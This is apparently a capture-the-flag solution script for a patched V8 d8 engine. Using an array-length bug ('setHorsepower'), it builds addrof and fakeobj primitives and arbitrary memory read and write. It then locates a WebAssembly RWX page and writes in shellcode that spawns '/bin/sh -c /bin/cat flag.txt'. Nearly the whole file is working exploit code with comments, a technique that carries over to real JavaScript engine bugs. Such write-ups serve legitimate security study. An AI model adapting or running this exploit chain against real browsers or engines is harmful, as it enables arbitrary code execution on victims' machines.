// lldb d8 
// run --allow-natives-syntax --shell ./solve.js

var buf = new ArrayBuffer(8);
var u64_buf = new Uint32Array(buf);
var f64_buf = new Float64Array(buf);

function hex(val) {
	return ftoi(val).toString(16)
}

function itof(val) {
	u64_buf[0] = Number(BigInt(val) & 0xffffffffn);
	u64_buf[1] = Number(BigInt(val) >> 32n);
	return f64_buf[0];
}

function ftoi(val) {
	f64_buf[0] = val;
	return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function addrof(obj) {
	// 6 was found by doing address of first element in the object array
	// minus the address of the first element in the double array
	y[0] = obj
	return ftoi(x[6]) & 0xffffffffn;
}

// Reverse
function fakeobj(addr) {
	x[6] = itof(addr)
	return y[0]
}



function arb_read(addr) {
	// 0x20 is the offset between the pointer to the elements pointer of the read_arr object to the object to the address we want to read
	// The idea is that the address we want to read is now interpreted as the elements array
	// This is to ensure interpretation of the address as a heap object
	if (addr % 0x2n == 0x0n) {
		addr += 0x1n
	}
	var size = ftoi(x[20]) & 0xf00000000n // should equal 8 and it does
	var fake_addr = addr - 0x8n // we subtract 8 because the elements array contains some meta data in the first 8 bytes
	x[20] = itof(size + fake_addr)
	//console.log(read_arr[0])
	return read_arr[0]

}

// Write value to the corresponding addr
function arb_write(addr, val) {
	if (addr % 0x2n == 0x0n) {
		addr += 0x1n
	}
	var size = ftoi(x[20]) & 0xf00000000n
	var fake_addr = addr - 0x8n
	x[20] = itof(size + fake_addr)
	read_arr[0] = itof(val) // At this point read_arr points to something different, and we are assigning the value at this different location to the val
	return read_arr[0]

}


// TODO: Understand what is backing store in an array buffer
function copy_shellcode(addr, shellcode) {
	console.log("[*] writing shellcode to RWX page...")

	let buf = new ArrayBuffer(0x100)
	let dataview = new DataView(buf)
	let buf_addr = addrof(buf)
	print("[*] buf_addr:", buf_addr)
	let backing_store_addr = buf_addr + 0x14n

	arb_write(backing_store_addr, addr)
	print("[*] backing_store_addr:", backing_store_addr)

	for (let i = 0;i < shellcode.length;i++) {
		dataview.setUint8(i, shellcode[i], true)
	}
	print("[*] shellcode writing successfully completed!")
}

var x = [1.1,1.2,1.3]

// The offset of this is:
var y = [{"a": "b"}]

// The offset of this is:
var read_arr = [3.3, 4.4, 5.5, 6.6]
x.setHorsepower(100)
//console.log(ftoi(arb_read(0x08086000n)).toString(16))

// Arbitrary read array needs to contain the following:
// [map_address of x, random double, addr, random double]
// The interpretation by JavaScript will become that of a HeapObject
// [map address, properties, elements, array size]


// Now we must construct a rwx page using wasm 
// The wasm code itself doesn't actually matter that much. The wasm_code is used to create the rwx page
// In order to know why this happens, we need to visit the code itself
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code)
var wasm_instance = new WebAssembly.Instance(wasm_mod)
var f = wasm_instance.exports.main

// Get the rwx address by getting the address of the instance. Afterwards, we read the value at that address. This gives us the address of the rwx page
rwx_page_addr = arb_read(addrof(wasm_instance)+0x68n - 1n)
console.log(hex(rwx_page_addr))


var shellcode = [
	 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x99, 0x50, 0x54, 0x5f, 0x52
	, 0x66, 0x68, 0x2d, 0x63, 0x54, 0x5e, 0x52, 0xe8, 0x12, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69
	, 0x6e, 0x2f, 0x63, 0x61, 0x74, 0x20, 0x66, 0x6c, 0x61, 0x67, 0x2e, 0x74, 0x78, 0x74, 0x00
	, 0x56, 0x57, 0x54, 0x5e, 0x6a, 0x3b, 0x58, 0x0f, 0x05
	//   0x6a, 0x0b, 0x58, 0x99, 0x52, 0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68
	// , 0x00, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x12, 0x00, 0x00, 0x00, 0x2f
	// , 0x62, 0x69, 0x6e, 0x2f, 0x63, 0x61, 0x74, 0x20, 0x66, 0x6c, 0x61, 0x67, 0x2e, 0x74, 0x78
	// , 0x74, 0x00, 0x57, 0x53, 0x89, 0xe1, 0xcd, 0x80
]

copy_shellcode(ftoi(rwx_page_addr), shellcode)
f();
